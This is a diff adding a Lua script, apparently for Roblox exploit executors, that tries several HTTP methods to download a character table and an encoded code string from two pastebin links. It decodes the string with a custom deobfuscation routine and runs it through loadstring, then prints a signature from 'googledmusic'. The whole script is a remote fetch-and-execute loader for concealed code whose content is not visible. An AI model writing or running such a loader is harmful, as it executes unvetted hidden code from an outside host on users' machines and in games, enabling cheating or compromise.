@@ -1,0 +1,108 @@
+local function GetLink (Link)
+local Body = "Unable To Get Body."
+local DefBody = Body
+pcall(function()
+Body = HttpGet(Link)
+end)
+if Body == DefBody then
+pcall(function()
+Body = game:HttpGet(Link)
+end)
+if Body == DefBody then
+pcall(function()
+Body = game:HttpGetAsync(Link)
+end)
+if Body == DefBody then
+pcall(function()
+Body = game:GetService("HttpService"):GetAsync(Link)
+end)
+return Body
+else
+return Body
+end
+else
+return Body
+end
+else
+return Body
+end
+end
+
+local function SeparateString(Str)
+local Arr = {}
+local Len = string.len(Str)
+for i = 0,Len do
+local SubStr = string.sub(Str,i,i)
+table.insert(Arr,SubStr)
+end
+return Arr
+end
+
+local function CreateCharsArrayFromString(Str)
+local Arr = {}
+for i, v in pairs(SeparateString(Str)) do
+Arr[v] = true
+end
+return Arr
+end
+
+local function StringToArray(String,Separator)
+local Array = {}
+local ExtStr = String
+repeat
+if ExtStr == "" or ExtStr == " " then
+
+else
+local Start = string.find(ExtStr,Separator)
+if Start ~= nil then
+local Arg = string.sub(ExtStr,0,Start-1)
+table.insert(Array,Arg)
+ExtStr = string.sub(ExtStr,Start+string.len(Separator))
+else
+table.insert(Array,ExtStr)
+ExtStr = ""
+end
+end
+until ExtStr == "" or ExtStr == Separator
+if string.lower(Array[1]) == "/e" then
+Array[1] = nil
+for i, v in pairs(Array) do
+if i == 1 then
+
+else
+Array[i-1] = v
+end
+end
+end
+return Array
+end
+
+local function DeobfusicateScript(Data)
+local NewCode = ""
+local Str = StringToArray(Data.code,"</")
+for i, v in pairs(Str) do
+local Letter = nil
+for e, l in pairs(Data.Chars) do
+if e ~= nil and string.byte(tostring(e)) ~= nil then
+if v == tostring(string.byte(tostring(e)))..">" then
+Letter = e
+end
+end
+end
+if Letter ~= nil then
+NewCode = NewCode..Letter
+end
+end
+return NewCode
+end
+
+
+local Ob = {Chars = CreateCharsArrayFromString(GetLink("https://pastebin.com/raw/9xNHyRSk")),code = GetLink("https://pastebin.com/raw/0mjuf7z4")}
+for i, v in pairs(Ob.Chars) do
+print(i)
+end
+local osb = DeobfusicateScript(Ob)
+print("start")
+loadstring(osb)()
+print("the end")
+print("googledmusic was here and if you're making a video why didn't you like my video :c")
